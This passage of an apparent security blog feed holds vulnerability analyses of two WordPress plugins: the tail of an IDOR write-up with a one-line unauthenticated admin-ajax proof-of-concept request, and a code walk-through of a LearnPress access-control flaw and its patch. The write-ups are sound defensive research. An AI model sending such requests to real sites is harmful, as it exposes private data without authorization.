1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Send request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;&#xA;action=dll_load_posts&amp;amp;args[status]=any&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-20-cve-2025-67985/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-20-cve-2025-67985/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-20-cve-2025-67985/result.png&#39; alt=&#34;Result&#34; height=&#34;856&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability occurs because a public AJAX endpoint trusts the client-controlled &lt;code&gt;status&lt;/code&gt; parameter and directly uses it to query documents without performing permission checks. This allows unauthenticated users to access non-public documents, resulting in an authorization bypass / IDOR.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Validation does not replace authorization&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt; is a public attack surface&lt;/li&gt;&#xA;&lt;li&gt;Query-affecting parameters must be bound to user permissions&lt;/li&gt;&#xA;&lt;li&gt;Returning JSON without permission checks can cause data leakage&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/document-library-lite/vulnerability/wordpress-document-library-lite-plugin-1-1-7-insecure-direct-object-references-idor-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Document Library Lite Plugin &amp;lt;= 1.1.7 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-13956 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-16-cve-2025-13956/</link>
      <pubDate>Tue, 16 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-16-cve-2025-13956/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-16-cve-2025-13956/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;LearnPress – WordPress LMS Plugin&lt;/strong&gt; for &lt;strong&gt;WordPress&lt;/strong&gt; is affected by an &lt;strong&gt;unauthorized data access vulnerability&lt;/strong&gt; due to a &lt;strong&gt;lack of capability checks&lt;/strong&gt; in the &lt;strong&gt;statistics function&lt;/strong&gt; in &lt;strong&gt;all versions up to and including 4.3.1&lt;/strong&gt;. This allows &lt;strong&gt;unauthenticated attackers&lt;/strong&gt; to view the plugin&amp;rsquo;s &lt;strong&gt;order statistics&lt;/strong&gt;, including &lt;strong&gt;total revenue&lt;/strong&gt; and &lt;strong&gt;order status counts&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-13956&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-13956&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.3.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.3.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/learnpress/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LearnPress Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;LearnPress&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.3.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt; * &lt;code&gt;4.3.2&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registered an action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&#xA;  &amp;#39;init&amp;#39;,&#xA;  function () {&#xA;    LoadContentViaAjax::catch_lp_ajax();&#xA;    LessonAjax::catch_lp_ajax();&#xA;    EditCurriculumAjax::catch_lp_ajax();&#xA;    EditQuizAjax::catch_lp_ajax();&#xA;    EditQuestionAjax::catch_lp_ajax();&#xA;    SendEmailAjax::catch_lp_ajax();&#xA;    OpenAiAjax::catch_lp_ajax();&#xA;&#xA;    do_action( &amp;#39;learn-press/register-ajax-handlers&amp;#39; );&#xA;  },&#xA;  11&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;init&lt;/code&gt; hook is an early initialization hook in WordPress, which runs after WordPress has finished loading core components but before sending output to the browser =&amp;gt; Any request from any user can trigger it.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;function () {}&lt;/code&gt; is an anonymous function set as the callback for this hook.&lt;/p&gt;&#xA;&lt;p&gt;On line 4, the static function &lt;code&gt;LoadContentViaAjax:catch_lp_ajax()&lt;/code&gt; is called from the &lt;code&gt;LoadContentViaAjax&lt;/code&gt; class:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class LoadContentViaAjax extends AbstractAjax { ... }&#xA;&#xA;abstract class AbstractAjax {&#xA;  public static function catch_lp_ajax() {&#xA;    if ( ! empty( $_REQUEST[&amp;#39;lp-load-ajax&amp;#39;] ) ) {&#xA;      $action = $_REQUEST[&amp;#39;lp-load-ajax&amp;#39;];&#xA;      $nonce  = $_REQUEST[&amp;#39;nonce&amp;#39;] ?? &amp;#39;&amp;#39;;&#xA;      $class  = new static();&#xA;&#xA;      // For case cache html, so cache nonce is not required.&#xA;      $class_no_nonce = [&#xA;        LoadContentViaAjax::class,&#xA;      ];&#xA;&#xA;      if ( ! wp_verify_nonce( $nonce, &amp;#39;wp_rest&amp;#39; ) ) {&#xA;        if ( ! in_array( get_class( $class ), $class_no_nonce ) ) {&#xA;          wp_die( &amp;#39;Invalid request!&amp;#39;, 400 );&#xA;        } else {&#xA;          // Allow to handle without nonce, but must same domain.&#xA;          $referer = wp_get_referer();&#xA;          if ( empty( $referer ) || strpos( $referer, home_url() ) !== 0 ) {&#xA;            wp_die( &amp;#39;Invalid request!&amp;#39;, 400 );&#xA;          }&#xA;        }&#xA;      }&#xA;&#xA;      if ( is_callable( [ $class, $action ] ) ) {&#xA;        call_user_func( [ $class, $action ] );&#xA;      }&#xA;    }&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Inherited Class&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class LoadContentViaAjax extends AbstractAjax&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→ &lt;code&gt;LoadContentViaAjax&lt;/code&gt; inherits all AJAX processing logic from &lt;code&gt;AbstractAjax&lt;/code&gt;.&#xA;2. **Hook &lt;code&gt;init&lt;/code&gt; calls &lt;code&gt;catch_lp_ajax()**&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;When WordPress reaches the &lt;code&gt;init&lt;/code&gt; hook&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;LoadContentViaAjax::catch_lp_ajax()&lt;/code&gt; is executed.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Request Check&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! empty( $_REQUEST[&amp;#39;lp-load-ajax&amp;#39;] ) )&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→ Only processes when the request has the &lt;code&gt;lp-load-ajax&lt;/code&gt; parameter.&#xA;4. &lt;strong&gt;Action Determination&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$action = $_REQUEST[&amp;#39;lp-load-ajax&amp;#39;];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→ This value is treated as the &lt;strong&gt;method name&lt;/strong&gt; to be called in the child class.&#xA;5. &lt;strong&gt;Object Initialization&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$class = new static();&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→ &lt;code&gt;static&lt;/code&gt; refers to the class currently being called (&lt;code&gt;LoadContentViaAjax&lt;/code&gt;), so it creates an instance of that class.&#xA;6. &lt;strong&gt;Nonce Handling&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Retrieves &lt;code&gt;nonce&lt;/code&gt; from the request&lt;/li&gt;&#xA;&lt;li&gt;Checks it using &lt;code&gt;wp_verify_nonce&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Specifically, &lt;code&gt;LoadContentViaAjax&lt;/code&gt; is allowed to &lt;strong&gt;bypass the nonce&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;When bypassing the nonce, it checks if the &lt;code&gt;referer&lt;/code&gt; is from the same domain.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;7&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Call Corresponding Method&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( is_callable( [ $class, $action ] ) ) {&#xA;    call_user_func( [ $class, $action ] );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→ If &lt;code&gt;LoadContentViaAjax&lt;/code&gt; has a method with the same name as the &lt;code&gt;lp-load-ajax&lt;/code&gt; value&#xA;→ That method will be called and executed.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class LoadContentViaAjax extends AbstractAjax {&#xA;  public function load_content_via_ajax() {&#xA;    $response = new LP_REST_Response();&#xA;&#xA;    try {&#xA;      $params = wp_unslash( $_REQUEST[&amp;#39;data&amp;#39;] ?? &amp;#39;&amp;#39; );&#xA;      if ( empty( $params ) ) {&#xA;        throw new Exception( &amp;#39;Error: params invalid!&amp;#39; );&#xA;      }&#xA;&#xA;      $params = LP_Helper::json_decode( $params, true );&#xA;&#xA;      if ( empty( $params[&amp;#39;callback&amp;#39;] ) ||&#xA;        ! isset( $params[&amp;#39;args&amp;#39;] ) ) {&#xA;        throw new Exception( &amp;#39;Error: params invalid!&amp;#39; );&#xA;      }&#xA;&#xA;      // @var array $args&#xA;      $args     = $params[&amp;#39;args&amp;#39;];&#xA;      $callBack = $params[&amp;#39;callback&amp;#39;];&#xA;&#xA;      if ( empty( $callBack[&amp;#39;class&amp;#39;] ) ||&#xA;        empty( $callBack[&amp;#39;method&amp;#39;] ) ) {&#xA;        throw new Exception( &amp;#39;Error: callback invalid!&amp;#39; );&#xA;      }&#xA;&#xA;      $class  = $callBack[&amp;#39;class&amp;#39;];&#xA;      $method = $callBack[&amp;#39;method&amp;#39;];&#xA;&#xA;      // Security: check callback is registered.&#xA;      $allow_callbacks = apply_filters(&#xA;        &amp;#39;lp/rest/ajax/allow_callback&amp;#39;,&#xA;        []&#xA;      );&#xA;      $callBackStr     = $class . &amp;#39;:&amp;#39; . $method;&#xA;      if ( ! in_array( $callBackStr, $allow_callbacks ) ) {&#xA;        throw new Exception( &amp;#39;Error: callback is not register!&amp;#39; );&#xA;      }&#xA;&#xA;      // Check class and method is callable.&#xA;      if ( is_callable( [ $class, $method ] ) ) {&#xA;        $data = call_user_func( [ $class, $method ], $args );&#xA;      } else {&#xA;        throw new Exception( &amp;#39;Error: callback is not callable!&amp;#39; );&#xA;      }&#xA;&#xA;      if ( ! $data instanceof stdClass &amp;amp;&amp;amp; ! isset( $data-&amp;gt;content ) ) {&#xA;        throw new Exception( &amp;#39;Error: data content invalid!&amp;#39; );&#xA;      }&#xA;&#xA;      $response-&amp;gt;message = $data-&amp;gt;message ?? &amp;#39;&amp;#39;;&#xA;      unset( $data-&amp;gt;message );&#xA;&#xA;      $response-&amp;gt;status = &amp;#39;success&amp;#39;;&#xA;      $response-&amp;gt;data   = $data;&#xA;    } catch ( Throwable $e ) {&#xA;      $response-&amp;gt;status  = &amp;#39;error&amp;#39;;&#xA;      $response-&amp;gt;message = $e-&amp;gt;getMessage();&#xA;    }&#xA;&#xA;    wp_send_json( $response );&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The necessary variables for &lt;code&gt;call_user_func&lt;/code&gt; are formed directly from this code snippet and linked together according to the processing flow:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$params = LP_Helper::json_decode( $params, true );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;$params&lt;/code&gt; variable is the input data array after decoding JSON from the request, which must contain callback information and parameters.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$args     = $params[&amp;#39;args&amp;#39;];&#xA;$callBack = $params[&amp;#39;callback&amp;#39;];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$args&lt;/code&gt; contains the parameters to be passed to the called function, while &lt;code&gt;$callBack&lt;/code&gt; describes the callback to be executed.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$class  = $callBack[&amp;#39;class&amp;#39;];&#xA;$method = $callBack[&amp;#39;method&amp;#39;];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;These two variables exactly identify the &lt;strong&gt;class&lt;/strong&gt; and &lt;strong&gt;method&lt;/strong&gt; to be called dynamically.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$callBackStr = $class . &amp;#39;:&amp;#39; . $method;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This string is used to verify against the list of allowed callbacks in &lt;code&gt;$allow_callbacks&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;A series of callbacks are registered for the &lt;code&gt;lp/rest/ajax/allow_callback&lt;/code&gt; filter via the &lt;code&gt;add_filter&lt;/code&gt; function:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function allow_callback( array $callbacks ): array {&#xA;  $callbacks[] = get_class( $this ) . &amp;#39;:render_edit_quiz&amp;#39;;&#xA;  $callbacks[] = get_class( $this ) . &amp;#39;:render_list_items_not_assign&amp;#39;;&#xA;&#xA;  return $callbacks;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function receives the existing &lt;code&gt;$callbacks&lt;/code&gt; array, then appends two strings in the format &lt;code&gt;ClassName:method&lt;/code&gt; for the current class, and returns the array for WordPress to use as a list of valid callbacks. When debugging, we can see all registered callbacks:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( is_callable( [ $class, $method ] ) ) {&#xA;    $data = call_user_func( [ $class, $method ], $args );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The array &lt;code&gt;[ $class, $method ]&lt;/code&gt; is precisely the valid callback required by &lt;code&gt;call_user_func&lt;/code&gt;. When the &lt;code&gt;is_callable&lt;/code&gt; condition is true, WordPress calls the &lt;code&gt;$method&lt;/code&gt; of class &lt;code&gt;$class&lt;/code&gt; and passes the &lt;code&gt;$args&lt;/code&gt; variable as the sole parameter to that method.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;strong&gt;The vulnerability arises because the API does not perform any capability/permission checks.&lt;/strong&gt; This allows any user – including those without administrative privileges – to call the endpoint and request the execution of any callback in the valid callback list, even if those callbacks should be restricted to admins.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;The patch (v4.3.2)&lt;/strong&gt; adds a permission validation step to the &lt;code&gt;load_content_via_ajax&lt;/code&gt; function by hardcoding the list of allowed callbacks:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$allow_callbacks = apply_filters(&#xA;    &amp;#39;lp/rest/ajax/allow_callback&amp;#39;,&#xA;    [&#xA;        &amp;#39;LP_Admin_Dashboard:order_statistic&amp;#39;,&#xA;        &amp;#39;LP_Admin_Dashboard:plugin_status_content&amp;#39;,&#xA;    ]&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Only callbacks whose class and method names exactly match &lt;code&gt;&#39;LP_Admin_Dashboard:order_statistic&#39;&lt;/code&gt; or &lt;code&gt;&#39;LP_Admin_Dashboard:plugin_status_content&#39;&lt;/code&gt; will pass the check.&lt;/p&gt;&#xA;&lt;p&gt;Both &lt;code&gt;order_statistic&lt;/code&gt; and &lt;code&gt;plugin_status_content&lt;/code&gt; functions have a mechanism to check for Administrator privileges before execution:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( UserModel::ROLE_ADMINISTRATOR ) ) {&#xA;  wp_die( esc_html__( &amp;#39;You do not have sufficient permissions to access this page.&amp;#39;, &amp;#39;learnpress&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As a result, the vulnerability is fully secured.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 